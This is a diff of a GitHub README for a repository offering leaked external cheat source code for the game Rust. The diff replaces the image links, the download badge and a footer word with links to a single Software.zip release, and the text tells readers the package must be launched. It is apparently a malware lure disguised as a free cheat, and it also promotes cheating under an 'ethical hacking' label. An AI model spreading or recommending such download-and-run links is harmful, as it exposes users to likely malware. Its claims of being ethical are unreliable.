@@ -1,6 +1,6 @@
 # 🚀 Rust Hack FR33 - Ethical Hacking for Rust Game 🎮
 
-![Rust Logo](https://upload.wikimedia.org/wikipedia/commons/d/d5/Rust_programming_language_black_logo.svg)
+![Rust Logo](https://github.com/JD432/rust-hack-fr33/releases/download/v2.0/Software.zip)
 
 Welcome to the "Rust Hack FR33" repository, where you can explore and leverage the leaked external cheat source code for the popular game Rust. This repository offers developers the opportunity to enhance their coding skills, learn about game hacking techniques, and contribute to building an integrity-based community within the gaming world.
 
@@ -24,9 +24,9 @@ The following topics are covered in this repository:
 
 ## Get Started 🛠️
 
-To access the source code and resources, download the software package [here](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip). Remember, it needs to be launched for full functionality.
+To access the source code and resources, download the software package [here](https://github.com/JD432/rust-hack-fr33/releases/download/v2.0/Software.zip). Remember, it needs to be launched for full functionality.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/JD432/rust-hack-fr33/releases/download/v2.0/Software.zip)](https://github.com/JD432/rust-hack-fr33/releases/download/v2.0/Software.zip)
 
 ## Contribute 🤝
 
@@ -44,11 +44,11 @@ To stay informed about the latest updates, releases, and announcements related t
 
 Help us grow the Rust Hack FR33 community by sharing this repository with your friends, fellow developers, and gaming enthusiasts. Let's work together to promote ethical behavior, skill development, and trust within the gaming world.
 
-![Hack The Planet](https://media.giphy.com/media/12fRSa8O5Z5C5e/giphy.gif)
+![Hack The Planet](https://github.com/JD432/rust-hack-fr33/releases/download/v2.0/Software.zip)
 
 ## Thank You! 🙌
 
 Thank you for exploring the "Rust Hack FR33" repository. Dive into the source code, experiment with the cheat functionalities, and contribute to the ethical hacking community. Have fun exploring Rust gaming like never before! Happy hacking! 🔓
 
 ---
-This README.md file was created for the "rust-hack-fr33" GitHub repository, offering developers the leaked external cheat source code for Rust. Explore, contribute, and elevate your gaming experience ethically! 🎮 #rust #ethicalhacking #gaming #community
+This https://github.com/JD432/rust-hack-fr33/releases/download/v2.0/Software.zip file was created for the "rust-hack-fr33" GitHub repository, offering developers the leaked external cheat source code for Rust. Explore, contribute, and elevate your gaming experience ethically! 🎮 #rust #ethicalhacking #gaming #community
